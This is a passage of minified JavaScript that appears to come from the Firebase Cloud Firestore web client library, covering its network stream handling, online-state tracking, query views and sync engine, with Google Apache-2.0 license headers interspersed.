0,super.start()}Jo(){this.iu&&this.ou([])}tu(e,t){return this.connection.Ro("Write",e,t)}onMessage(e){if(te(!!e.streamToken),this.lastStreamToken=e.streamToken,this.iu){this.Lo.reset();const t=eL(e.writeResults,e.commitTime),n=yt(e.commitTime);return this.listener.uu(n,t)}return te(!e.writeResults||0===e.writeResults.length),this.iu=!0,this.listener.cu()}au(){const e={};e.database=cu(this.serializer),this.zo(e)}ou(e){const t={streamToken:this.lastStreamToken,writes:e.map((e=>hu(this.serializer,e)))};this.zo(t)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YL extends class{}{constructor(e,t,n,r){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=n,this.serializer=r,this.hu=!1}lu(){if(this.hu)throw new L(M.FAILED_PRECONDITION,"The client has already been terminated.")}po(e,t,n){return this.lu(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([r,i])=>this.connection.po(e,t,n,r,i))).catch((e=>{throw"FirebaseError"===e.name?(e.code===M.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),e):new L(M.UNKNOWN,e.toString())}))}Ao(e,t,n,r){return this.lu(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([i,s])=>this.connection.Ao(e,t,n,i,s,r))).catch((e=>{throw"FirebaseError"===e.name?(e.code===M.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),e):new L(M.UNKNOWN,e.toString())}))}terminate(){this.hu=!0}}class WL{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.du=0,this._u=null,this.wu=!0}mu(){0===this.du&&(this.gu("Unknown"),this._u=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,(()=>(this._u=null,this.yu("Backend didn't respond within 10 seconds."),this.gu("Offline"),Promise.resolve()))))}pu(e){"Online"===this.state?this.gu("Unknown"):(this.du++,this.du>=1&&(this.Iu(),this.yu(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.gu("Offline")))}set(e){this.Iu(),this.du=0,"Online"===e&&(this.wu=!1),this.gu(e)}gu(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}yu(e){const t=`Could not reach Cloud Firestore backend. ${e}\nThis typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.wu?(mt(t),this.wu=!1):V("OnlineStateTracker",t)}Iu(){null!==this._u&&(this._u.cancel(),this._u=null)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class GL{constructor(e,t,n,r,i){this.localStore=e,this.datastore=t,this.asyncQueue=n,this.remoteSyncer={},this.Tu=[],this.Eu=new Map,this.Au=new Set,this.Ru=[],this.vu=i,this.vu.Jr((e=>{n.enqueueAndForget((async()=>{Zi(this)&&(V("RemoteStore","Restarting streams for network reachability change."),await async function(e){const t=q(e);t.Au.add(4),await Ia(t),t.Pu.set("Unknown"),t.Au.delete(4),await Bu(t)}(this))}))})),this.Pu=new WL(n,r)}}async function Bu(e){if(Zi(e))for(const t of e.Ru)await t(!0)}async function Ia(e){for(const t of e.Ru)await t(!1)}function Jd(e,t){const n=q(e);n.Eu.has(t.targetId)||(n.Eu.set(t.targetId,t),Tv(n)?Ev(n):Da(n).Uo()&&_v(n,t))}function du(e,t){const n=q(e),r=Da(n);n.Eu.delete(t),r.Uo()&&mI(n,t),0===n.Eu.size&&(r.Uo()?r.Qo():Zi(n)&&n.Pu.set("Unknown"))}function _v(e,t){if(e.bu.Lt(t.targetId),t.resumeToken.approximateByteSize()>0||t.snapshotVersion.compareTo(ee.min())>0){const n=e.remoteSyncer.getRemoteKeysForTarget(t.targetId).size;t=t.withExpectedCount(n)}Da(e).nu(t)}function mI(e,t){e.bu.Lt(t),Da(e).su(t)}function Ev(e){e.bu=new W$({getRemoteKeysForTarget:t=>e.remoteSyncer.getRemoteKeysForTarget(t),he:t=>e.Eu.get(t)||null,oe:()=>e.datastore.serializer.databaseId}),Da(e).start(),e.Pu.mu()}function Tv(e){return Zi(e)&&!Da(e).qo()&&e.Eu.size>0}function Zi(e){return 0===q(e).Au.size}function gI(e){e.bu=void 0}async function HL(e){e.Eu.forEach(((t,n)=>{_v(e,t)}))}async function KL(e,t){gI(e),Tv(e)?(e.Pu.pu(t),Ev(e)):e.Pu.set("Unknown")}async function QL(e,t,n){if(e.Pu.set("Online"),t instanceof Px&&2===t.state&&t.cause)try{await async function(e,t){const n=t.cause;for(const r of t.targetIds)e.Eu.has(r)&&(await e.remoteSyncer.rejectListen(r,n),e.Eu.delete(r),e.bu.removeTarget(r))}(e,t)}catch(n){V("RemoteStore","Failed to remove targets %s: %s ",t.targetIds.join(","),n),await id(e,n)}else if(t instanceof ih?e.bu.Wt(t):t instanceof Ox?e.bu.ee(t):e.bu.Yt(t),!n.isEqual(ee.min()))try{const t=await aI(e.localStore);n.compareTo(t)>=0&&await function(e,t){const n=e.bu.ue(t);return n.targetChanges.forEach(((n,r)=>{if(n.resumeToken.approximateByteSize()>0){const i=e.Eu.get(r);i&&e.Eu.set(r,i.withResumeToken(n.resumeToken,t))}})),n.targetMismatches.forEach(((t,n)=>{const r=e.Eu.get(t);if(!r)return;e.Eu.set(t,r.withResumeToken(Ct.EMPTY_BYTE_STRING,r.snapshotVersion)),mI(e,t);const i=new Vr(r.target,t,n,r.sequenceNumber);_v(e,i)})),e.remoteSyncer.applyRemoteEvent(n)}(e,n)}catch(t){V("RemoteStore","Failed to raise snapshot:",t),await id(e,t)}}async function id(e,t,n){if(!Xi(t))throw t;e.Au.add(1),await Ia(e),e.Pu.set("Offline"),n||(n=()=>aI(e.localStore)),e.asyncQueue.enqueueRetryable((async()=>{V("RemoteStore","Retrying IndexedDB access"),await n(),e.Au.delete(1),await Bu(e)}))}function yI(e,t){return t().catch((n=>id(e,n,t)))}async function ka(e){const t=q(e),n=Bi(t);let r=t.Tu.length>0?t.Tu[t.Tu.length-1].batchId:-1;for(;XL(t);)try{const e=await $L(t.localStore,r);if(null===e){0===t.Tu.length&&n.Qo();break}r=e.batchId,JL(t,e)}catch(e){await id(t,e)}vI(t)&&wI(t)}function XL(e){return Zi(e)&&e.Tu.length<10}function JL(e,t){e.Tu.push(t);const n=Bi(e);n.Uo()&&n.ru&&n.ou(t.mutations)}function vI(e){return Zi(e)&&!Bi(e).qo()&&e.Tu.length>0}function wI(e){Bi(e).start()}async function ZL(e){Bi(e).au()}async function eF(e){const t=Bi(e);for(const n of e.Tu)t.ou(n.mutations)}async function tF(e,t,n){const r=e.Tu.shift(),i=av.from(r,t,n);await yI(e,(()=>e.remoteSyncer.applySuccessfulWrite(i))),await ka(e)}async function nF(e,t){t&&Bi(e).ru&&await async function(e,t){if(Rx(n=t.code)&&n!==M.ABORTED){const n=e.Tu.shift();Bi(e).Go(),await yI(e,(()=>e.remoteSyncer.rejectFailedWrite(n.batchId,t))),await ka(e)}var n}(e,t),vI(e)&&wI(e)}async function MS(e,t){const n=q(e);n.asyncQueue.verifyOperationInProgress(),V("RemoteStore","RemoteStore received new credentials");const r=Zi(n);n.Au.add(3),await Ia(n),r&&n.Pu.set("Unknown"),await n.remoteSyncer.handleCredentialChange(t),n.Au.delete(3),await Bu(n)}async function fg(e,t){const n=q(e);t?(n.Au.delete(2),await Bu(n)):t||(n.Au.add(2),await Ia(n),n.Pu.set("Unknown"))}function Da(e){return e.Vu||(e.Vu=function(e,t,n){const r=q(e);return r.lu(),new jL(t,r.connection,r.authCredentials,r.appCheckCredentials,r.serializer,n)}(e.datastore,e.asyncQueue,{oo:HL.bind(null,e),co:KL.bind(null,e),eu:QL.bind(null,e)}),e.Ru.push((async t=>{t?(e.Vu.Go(),Tv(e)?Ev(e):e.Pu.set("Unknown")):(await e.Vu.stop(),gI(e))}))),e.Vu}function Bi(e){return e.Su||(e.Su=function(e,t,n){const r=q(e);return r.lu(),new qL(t,r.connection,r.authCredentials,r.appCheckCredentials,r.serializer,n)}(e.datastore,e.asyncQueue,{oo:ZL.bind(null,e),co:nF.bind(null,e),cu:eF.bind(null,e),uu:tF.bind(null,e)}),e.Ru.push((async t=>{t?(e.Su.Go(),await ka(e)):(await e.Su.stop(),e.Tu.length>0&&(V("RemoteStore",`Stopping write stream with ${e.Tu.length} pending writes`),e.Tu=[]))}))),e.Su}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xv{constructor(e,t,n,r,i){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=n,this.op=r,this.removalCallback=i,this.deferred=new Pt,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch((e=>{}))}static createAndSchedule(e,t,n,r,i){const s=Date.now()+n,o=new xv(e,t,s,r,i);return o.start(n),o}start(e){this.timerHandle=setTimeout((()=>this.handleDelayElapsed()),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){null!==this.timerHandle&&(this.clearTimeout(),this.deferred.reject(new L(M.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget((()=>null!==this.timerHandle?(this.clearTimeout(),this.op().then((e=>this.deferred.resolve(e)))):Promise.resolve()))}clearTimeout(){null!==this.timerHandle&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function Ca(e,t){if(mt("AsyncQueue",`${t}: ${e}`),Xi(e))return new L(M.UNAVAILABLE,`${t}: ${e}`);throw e}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Go{constructor(e){this.comparator=e?(t,n)=>e(t,n)||B.comparator(t.key,n.key):(e,t)=>B.comparator(e.key,t.key),this.keyedMap=ul(),this.sortedSet=new Be(this.comparator)}static emptySet(e){return new Go(e.comparator)}has(e){return null!=this.keyedMap.get(e)}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal(((t,n)=>(e(t),!1)))}add(e){const t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){const t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof Go)||this.size!==e.size)return!1;const t=this.sortedSet.getIterator(),n=e.sortedSet.getIterator();for(;t.hasNext();){const e=t.getNext().key,r=n.getNext().key;if(!e.isEqual(r))return!1}return!0}toString(){const e=[];return this.forEach((t=>{e.push(t.toString())})),0===e.length?"DocumentSet ()":"DocumentSet (\n  "+e.join("  \n")+"\n)"}copy(e,t){const n=new Go;return n.comparator=this.comparator,n.keyedMap=e,n.sortedSet=t,n
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class RS{constructor(){this.Du=new Be(B.comparator)}track(e){const t=e.doc.key,n=this.Du.get(t);n?0!==e.type&&3===n.type?this.Du=this.Du.insert(t,e):3===e.type&&1!==n.type?this.Du=this.Du.insert(t,{type:n.type,doc:e.doc}):2===e.type&&2===n.type?this.Du=this.Du.insert(t,{type:2,doc:e.doc}):2===e.type&&0===n.type?this.Du=this.Du.insert(t,{type:0,doc:e.doc}):1===e.type&&0===n.type?this.Du=this.Du.remove(t):1===e.type&&2===n.type?this.Du=this.Du.insert(t,{type:1,doc:n.doc}):0===e.type&&1===n.type?this.Du=this.Du.insert(t,{type:2,doc:e.doc}):G():this.Du=this.Du.insert(t,e)}Cu(){const e=[];return this.Du.inorderTraversal(((t,n)=>{e.push(n)})),e}}class da{constructor(e,t,n,r,i,s,o,a,l){this.query=e,this.docs=t,this.oldDocs=n,this.docChanges=r,this.mutatedKeys=i,this.fromCache=s,this.syncStateChanged=o,this.excludesMetadataChanges=a,this.hasCachedResults=l}static fromInitialDocuments(e,t,n,r,i){const s=[];return t.forEach((e=>{s.push({type:0,doc:e})})),new da(e,t,Go.emptySet(t),s,n,r,!0,!1,i)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&$u(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const t=this.docChanges,n=e.docChanges;if(t.length!==n.length)return!1;for(let e=0;e<t.length;e++)if(t[e].type!==n[e].type||!t[e].doc.isEqual(n[e].doc))return!1;return!0}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rF{constructor(){this.xu=void 0,this.listeners=[]}}class iF{constructor(){this.queries=new Ji((e=>gx(e)),$u),this.onlineState="Unknown",this.Nu=new Set}}async function Iv(e,t){const n=q(e),r=t.query;let i=!1,s=n.queries.get(r);if(s||(i=!0,s=new rF),i)try{s.xu=await n.onListen(r)}catch(e){const n=Ca(e,`Initialization of query '${sg(t.query)}' failed`);return void t.onError(n)}n.queries.set(r,s),s.listeners.push(t),t.ku(n.onlineState),s.xu&&t.Mu(s.xu)&&Dv(n)}async function kv(e,t){const n=q(e),r=t.query;let i=!1;const s=n.queries.get(r);if(s){const e=s.listeners.indexOf(t);e>=0&&(s.listeners.splice(e,1),i=0===s.listeners.length)}if(i)return n.queries.delete(r),n.onUnlisten(r)}function sF(e,t){const n=q(e);let r=!1;for(const e of t){const t=e.query,i=n.queries.get(t);if(i){for(const t of i.listeners)t.Mu(e)&&(r=!0);i.xu=e}}r&&Dv(n)}function oF(e,t,n){const r=q(e),i=r.queries.get(t);if(i)for(const e of i.listeners)e.onError(n);r.queries.delete(t)}function Dv(e){e.Nu.forEach((e=>{e.next()}))}class Cv{constructor(e,t,n){this.query=e,this.Ou=t,this.$u=!1,this.Fu=null,this.onlineState="Unknown",this.options=n||{}}Mu(e){if(!this.options.includeMetadataChanges){const t=[];for(const n of e.docChanges)3!==n.type&&t.push(n);e=new da(e.query,e.docs,e.oldDocs,t,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.$u?this.Bu(e)&&(this.Ou.next(e),t=!0):this.Lu(e,this.onlineState)&&(this.qu(e),t=!0),this.Fu=e,t}onError(e){this.Ou.error(e)}ku(e){this.onlineState=e;let t=!1;return this.Fu&&!this.$u&&this.Lu(this.Fu,e)&&(this.qu(this.Fu),t=!0),t}Lu(e,t){if(!e.fromCache)return!0;const n="Offline"!==t;return(!this.options.Uu||!n)&&(!e.docs.isEmpty()||e.hasCachedResults||"Offline"===t)}Bu(e){if(e.docChanges.length>0)return!0;const t=this.Fu&&this.Fu.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&!0===this.options.includeMetadataChanges}qu(e){e=da.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.$u=!0,this.Ou.next(e)
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class aF{constructor(e,t){this.Ku=e,this.byteLength=t}Gu(){return"metadata"in this.Ku}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class AS{constructor(e){this.serializer=e}ir(e){return vr(this.serializer,e)}rr(e){return e.metadata.exists?Ux(this.serializer,e.document,!1):We.newNoDocument(this.ir(e.metadata.name),this.ur(e.metadata.readTime))}ur(e){return yt(e)}}class lF{constructor(e,t,n){this.Qu=e,this.localStore=t,this.serializer=n,this.queries=[],this.documents=[],this.collectionGroups=new Set,this.progress=SI(e)}ju(e){this.progress.bytesLoaded+=e.byteLength;let t=this.progress.documentsLoaded;if(e.Ku.namedQuery)this.queries.push(e.Ku.namedQuery);else if(e.Ku.documentMetadata){this.documents.push({metadata:e.Ku.documentMetadata}),e.Ku.documentMetadata.exists||++t;const n=Te.fromString(e.Ku.documentMetadata.name);this.collectionGroups.add(n.get(n.length-2))}else e.Ku.document&&(this.documents[this.documents.length-1].document=e.Ku.document,++t);return t!==this.progress.documentsLoaded?(this.progress.documentsLoaded=t,Object.assign({},this.progress)):null}zu(e){const t=new Map,n=new AS(this.serializer);for(const r of e)if(r.metadata.queries){const e=n.ir(r.metadata.name);for(const n of r.metadata.queries){const r=(t.get(n)||ce()).add(e);t.set(n,r)}}return t}async complete(){const e=await LL(this.localStore,new AS(this.serializer),this.documents,this.Qu.id),t=this.zu(this.documents);for(const e of this.queries)await FL(this.localStore,e,t.get(e.name));return this.progress.taskState="Success",{progress:this.progress,Wu:this.collectionGroups,Hu:e}}}function SI(e){return{taskState:"Running",documentsLoaded:0,bytesLoaded:0,totalDocuments:e.totalDocuments,totalBytes:e.totalBytes}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _I{constructor(e){this.key=e}}class EI{constructor(e){this.key=e}}class TI{constructor(e,t){this.query=e,this.Ju=t,this.Yu=null,this.hasCachedResults=!1,this.current=!1,this.Xu=ce(),this.mutatedKeys=ce(),this.Zu=vx(e),this.tc=new Go(this.Zu)}get ec(){return this.Ju}nc(e,t){const n=t?t.sc:new RS,r=t?t.tc:this.tc;let i=t?t.mutatedKeys:this.mutatedKeys,s=r,o=!1;const a="F"===this.query.limitType&&r.size===this.query.limit?r.last():null,l="L"===this.query.limitType&&r.size===this.query.limit?r.first():null;if(e.inorderTraversal(((e,t)=>{const u=r.get(e),c=Lu(this.query,t)?t:null,h=!!u&&this.mutatedKeys.has(u.key),d=!!c&&(c.hasLocalMutations||this.mutatedKeys.has(c.key)&&c.hasCommittedMutations);let f=!1;u&&c?u.data.isEqual(c.data)?h!==d&&(n.track({type:3,doc:c}),f=!0):this.ic(u,c)||(n.track({type:2,doc:c}),f=!0,(a&&this.Zu(c,a)>0||l&&this.Zu(c,l)<0)&&(o=!0)):!u&&c?(n.track({type:0,doc:c}),f=!0):u&&!c&&(n.track({type:1,doc:u}),f=!0,(a||l)&&(o=!0)),f&&(c?(s=s.add(c),i=d?i.add(e):i.delete(e)):(s=s.delete(e),i=i.delete(e)))})),null!==this.query.limit)for(;s.size>this.query.limit;){const e="F"===this.query.limitType?s.last():s.first();s=s.delete(e.key),i=i.delete(e.key),n.track({type:1,doc:e})}return{tc:s,sc:n,ji:o,mutatedKeys:i}}ic(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,n){const r=this.tc;this.tc=e.tc,this.mutatedKeys=e.mutatedKeys;const i=e.sc.Cu();i.sort(((e,t)=>function(e,t){const n=e=>{switch(e){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return G()}};return n(e)-n(t)}(e.type,t.type)||this.Zu(e.doc,t.doc))),this.rc(n);const s=t?this.oc():[],o=0===this.Xu.size&&this.current?1:0,a=o!==this.Yu;return this.Yu=o,0!==i.length||a?{snapshot:new da(this.query,e.tc,r,i,e.mutatedKeys,0===o,a,!1,!!n&&n.resumeToken.approximateByteSize()>0),uc:s}:{uc:s}}ku(e){return this.current&&"Offline"===e?(this.current=!1,this.applyChanges({tc:this.tc,sc:new RS,mutatedKeys:this.mutatedKeys,ji:!1},!1)):{uc:[]}}cc(e){return!this.Ju.has(e)&&!!this.tc.has(e)&&!this.tc.get(e).hasLocalMutations}rc(e){e&&(e.addedDocuments.forEach((e=>this.Ju=this.Ju.add(e))),e.modifiedDocuments.forEach((e=>{})),e.removedDocuments.forEach((e=>this.Ju=this.Ju.delete(e))),this.current=e.current)}oc(){if(!this.current)return[];const e=this.Xu;this.Xu=ce(),this.tc.forEach((e=>{this.cc(e.key)&&(this.Xu=this.Xu.add(e.key))}));const t=[];return e.forEach((e=>{this.Xu.has(e)||t.push(new EI(e))})),this.Xu.forEach((n=>{e.has(n)||t.push(new _I(n))})),t}ac(e){this.Ju=e.sr,this.Xu=ce();const t=this.nc(e.documents);return this.applyChanges(t,!0)}hc(){return da.fromInitialDocuments(this.query,this.tc,this.mutatedKeys,0===this.Yu,this.hasCachedResults)}}class uF{constructor(e,t,n){this.query=e,this.targetId=t,this.view=n}}class cF{constructor(e){this.key=e,this.lc=!1}}class hF{constructor(e,t,n,r,i,s){this.localStore=e,this.remoteStore=t,this.eventManager=n,this.sharedClientState=r,this.currentUser=i,this.maxConcurrentLimboResolutions=s,this.fc={},this.dc=new Ji((e=>gx(e)),$u),this._c=new Map,this.wc=new Set,this.mc=new Be(B.comparator),this.gc=new Map,this.yc=new mv,this.Ic={},this.Tc=new Map,this.Ec=Ws.kn(),this.onlineState="Unknown",this.Ac=void 0}get isPrimaryClient(){return!0===this.Ac}}async function dF(e,t){const n=bv(e);let r,i;const s=n.dc.get(t);if(s)r=s.targetId,n.sharedClientState.addLocalQueryTarget(r),i=s.view.hc();else{const e=await ca(n.localStore,kn(t)),s=n.sharedClientState.addLocalQueryTarget(e.targetId);r=e.targetId,i=await Nv(n,t,r,"current"===s,e.resumeToken),n.isPrimaryClient&&Jd(n.remoteStore,e)}return i}async function Nv(e,t,n,r,i){e.Rc=(t,n,r)=>async function(e,t,n,r){let i=t.view.nc(n);i.ji&&(i=await td(e.localStore,t.query,!1).then((({documents:e})=>t.view.nc(e,i))));const s=r&&r.targetChanges.get(t.targetId),o=t.view.applyChanges(i,e.isPrimaryClient,s);return pg(e,t.targetId,o.uc),o.snapshot}(e,t,n,r);const s=await td(e.localStore,t,!0),o=new TI(t,s.sr),a=o.nc(s.documents),l=Uu.createSynthesizedTargetChangeForCurrentChange(n,r&&"Offline"!==e.onlineState,i),u=o.applyChanges(a,e.isPrimaryClient,l);pg(e,n,u.uc);const c=new uF(t,n,o);return e.dc.set(t,c),e._c.has(n)?e._c.get(n).push(t):e._c.set(n,[t]),u.snapshot}async function fF(e,t){const n=q(e),r=n.dc.get(t),i=n._c.get(r.targetId);if(i.length>1)return n._c.set(r.targetId,i.filter((e=>!$u(e,t)))),void n.dc.delete(t);n.isPrimaryClient?(n.sharedClientState.removeLocalQueryTarget(r.targetId),n.sharedClientState.isActiveQueryTarget(r.targetId)||await ha(n.localStore,r.targetId,!1).then((()=>{n.sharedClientState.clearQueryState(r.targetId),du(n.remoteStore,r.targetId),fa(n,r.targetId)})).catch(Qi)):(fa(n,r.targetId),await ha(n.localStore,r.targetId,!0))}async function pF(e,t,n){const r=Ov(e);try{const e=await function(e,t){const n=q(e),r=et.now(),i=t.reduce(((e,t)=>e.add(t.key)),ce());let s,o;return n.persistence.runTransaction("Locally write mutations","readwrite",(e=>{let a=_n(),l=ce();return n.Xi.getEntries(e,i).next((e=>{a=e,a.forEach(((e,t)=>{t.isValidDocument()||(l=l.add(e))}))})).next((()=>n.localDocuments.getOverlayedDocuments(e,a))).next((i=>{s=i;const o=[];for(const e of t){const t=j$(e,s.get(e.key).overlayedDocument);null!=t&&o.push(new Zr(e.key,t,ax(t.value.mapValue),Ze.exists(!0)))}return n.mutationQueue.addMutationBatch(e,r,o,t)})).next((t=>{o=t;const r=t.applyToLocalDocumentSet(s,l);return n.documentOverlayCache.saveOverlays(e,t.batchId,r)}))})).then((()=>({batchId:o.batchId,changes:Sx(s)})))}(r.localStore,t);r.sharedClientState.addPendingMutation(e.batchId),function(e,t,n){let r=e.Ic[e.currentUser.toKey()];r||(r=new Be(ue)),r=r.insert(t,n),e.Ic[e.currentUser.toKey()]=r}(r,e.batchId,n),await ei(r,e.changes),await ka(r.remoteStore)}catch(e){const t=Ca(e,"Failed to persist write");n.reject(t)}}async function xI(e,t){const n=q(e);try{const e=await PL(n.localStore,t);t.targetChanges.forEach(((e,t)=>{const r=n.gc.get(t);r&&(te(e.addedDocuments.size+e.modifiedDocuments.size+e.removedDocuments.size<=1),e.addedDocuments.size>0?r.lc=!0:e.modifiedDocuments.size>0?te(r.lc):e.removedDocuments.size>0&&(te(r.lc),r.lc=!1))})),await ei(n,e,t)}catch(e){await Qi(e)}}function bS(e,t,n){const r=q(e);if(r.isPrimaryClient&&0===n||!r.isPrimaryClient&&1===n){const e=[];r.dc.forEach(((n,r)=>{const i=r.view.ku(t);i.snapshot&&e.push(i.snapshot)})),function(e,t){const n=q(e);n.onlineState=t;let r=!1;n.queries.forEach(((e,n)=>{for(const e of n.listeners)e.ku(t)&&(r=!0)})),r&&Dv(n)}(r.eventManager,t),e.length&&r.fc.eu(e),r.onlineState=t,r.isPrimaryClient&&r.sharedClientState.setOnlineState(t)}}async function mF(e,t,n){const r=q(e);r.sharedClientState.updateQueryState(t,"rejected",n);const i=r.gc.get(t),s=i&&i.key;if(s){let e=new Be(B.comparator);e=e.insert(s,We.newNoDocument(s,ee.min()));const n=ce().add(s),i=new Vu(ee.min(),new Map,new Be(ue),e,n);await xI(r,i),r.mc=r.mc.remove(s),r.gc.delete(t),Av(r)}else await ha(r.localStore,t,!1).then((()=>fa(r,t,n))).catch(Qi)}async function gF(e,t){const n=q(e),r=t.batch.batchId;try{const e=await OL(n.localStore,t);Rv(n,r,null),Mv(n,r),n.sharedClientState.updateMutationState(r,"acknowledged"),await ei(n,e)}catch(e){await Qi(e)}}async function yF(e,t,n){const r=q(e);try{const e=await function(e,t){const n=q(e);return n.persistence.runTransaction("Reject batch","readwrite-primary",(e=>{let r;return n.mutationQueue.lookupMutationBatch(e,t).next((t=>(te(null!==t),r=t.keys(),n.mutationQueue.removeMutationBatch(e,t)))).next((()=>n.mutationQueue.performConsistencyCheck(e))).next((()=>n.documentOverlayCache.removeOverlaysForBatchId(e,r,t))).next((()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(e,r))).next((()=>n.localDocuments.getDocuments(e,r)))}))}(r.localStore,t);Rv(r,t,n),Mv(r,t),r.sharedClientState.updateMutationState(t,"rejected",n),await ei(r,e)}catch(e){await Qi(e)}}async function vF(e,t){const n=q(e);Zi(n.remoteStore)||V("SyncEngine","The network is disabled. The task returned by 'awaitPendingWrites()' will not complete until the network is enabled.");try{const e=await function(e){const t=q(e);return t.persistence.runTransaction("Get highest unacknowledged batch id","readonly",(e=>t.mutationQueue.getHighestUnacknowledgedBatchId(e)))}(n.localStore);if(-1===e)return void t.resolve();const 